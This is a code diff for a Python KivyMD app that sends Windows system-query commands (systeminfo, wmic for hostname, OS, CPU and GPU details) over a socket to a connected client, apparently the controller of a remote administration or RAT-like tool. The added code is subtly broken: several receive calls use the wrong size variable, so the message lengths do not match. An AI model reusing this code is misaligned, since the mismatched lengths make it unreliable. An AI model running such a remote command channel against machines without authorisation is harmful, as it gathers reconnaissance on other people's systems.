@@ -200,24 +200,65 @@ class Main(MDApp):
             # Reset console
             self.root.ids.consoleField.text = ''
 
-            # Get OS Information
-            command = 'systeminfo | findstr /C:"OS"'
+            # Get Host/Machine Name
+            command = 'systeminfo | findstr /C:"Hostname"'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
             recvsize = self.currConn.recv(1024).decode()
             output = self.currConn.recv(int(recvsize)).decode()
 
+            # Get OS Information
+            command = 'systeminfo | findstr /C:"OS"'
+            self.currConn.send(command.encode())
+            print('Command sent to client: ', command)
+            recvsize2 = self.currConn.recv(1024).decode()
+            output2 = self.currConn.recv(int(recvsize)).decode()
+
+            #Get Processor Information
             command = 'wmic path win32_Processor get Name,NumberOfCores,NumberOfLogicalProcessors'
+            self.currConn.send(command.encode())
+            print('Command sent to client: ', command)
+            recvsize3 = self.currConn.recv(1024).decode()
+            output3 = self.currConn.recv(int(recvsize2)).decode()
+
+            # Print results
+            print('Output: \n')
+            print(output)
+            print(output2)
+            print(output3)
+            break
+
+    def GpuInfo(self):
+        while True:
+            # Reset console
+            self.root.ids.consoleField.text = ''
+
+            # Get GPU Name
+            command = 'wmic path win32_VideoController get name'
+            self.currConn.send(command.encode())
+            print('Command sent to client: ', command)
+            recvsize = self.currConn.recv(1024).decode()
+            output = self.currConn.recv(int(recvsize)).decode()
+
+            # Get GPU Description
+            command = 'wmic path win32_VideoController get Description'
             self.currConn.send(command.encode())
             print('Command sent to client: ', command)
             recvsize2 = self.currConn.recv(1024).decode()
             output2 = self.currConn.recv(int(recvsize2)).decode()
 
-            # Print results
+            # Get GPU Version
+            command = 'wmic path win32_VideoController get DriverVersion'
+            self.currConn.send(command.encode())
+            print('Command sent to client: ', command)
+            recvsize3 = self.currConn.recv(1024).decode()
+            output3 = self.currConn.recv(int(recvsize2)).decode()
 
+            # Print results
             print('Output: \n')
             print(output)
             print(output2)
+            print(output3)
             break
 
     # Zees stuff
@@ -287,7 +328,7 @@ class Main(MDApp):
             self.root.ids.consoleField.text = output
             break
 
-    # get memory information
+    # Get memory information
     def MemInfo(self):
         while True:
             # Reset console
